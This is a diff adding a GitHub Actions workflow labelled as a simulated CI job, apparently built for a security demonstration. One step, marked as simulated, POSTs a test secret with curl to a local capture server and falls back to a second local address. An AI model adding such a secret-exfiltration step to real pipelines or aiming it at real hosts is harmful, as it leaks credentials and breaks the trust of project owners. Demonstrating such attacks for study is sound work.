@@ -1,0 +1,40 @@
+
+name: CI (simulated)
+
+on:
+  workflow_dispatch: {}
+
+jobs:
+  ci_sim:
+    name: CI (simulated)
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout (noop)
+        uses: actions/checkout@v4
+
+      - name: Print placeholder
+        run: echo "Simulation job — no real build"
+
+      # Step that "exfiltrates" the secret to our local capture server
+      - name: Exfiltrate secret (simulated)
+        shell: bash
+        env:
+          ENDPOINT_TRY1: "http://host.docker.internal:5000/collect"
+          ENDPOINT_TRY2: "http://127.0.0.1:5000/collect"
+        run: |
+          echo "Testing exfiltration to capture server..."
+
+          # prepare payload JSON using the shell env var (no GitHub expression here)
+          payload="{\"workflow\":\"ci_simulated7_ci\",\"secret\":\"$TEST_SECRET\"}"
+
+          # Try host.docker.internal (works from Docker Desktop on Windows/mac)
+          curl -sS -X POST "$ENDPOINT_TRY1" -H "Content-Type: application/json" -d "$payload" || \
+          # fallback to 127.0.0.1 (works only if runner is the host)
+          curl -sS -X POST "$ENDPOINT_TRY2" -H "Content-Type: application/json" -d "$payload" || \
+          echo "⚠️ Exfiltration attempt failed (no reachable endpoint)"
+
+      - name: Show env (demo only)
+        run: |
+          # show length, but don't print the secret itself
+          echo "TEST_SECRET length: ${#TEST_SECRET}"
+
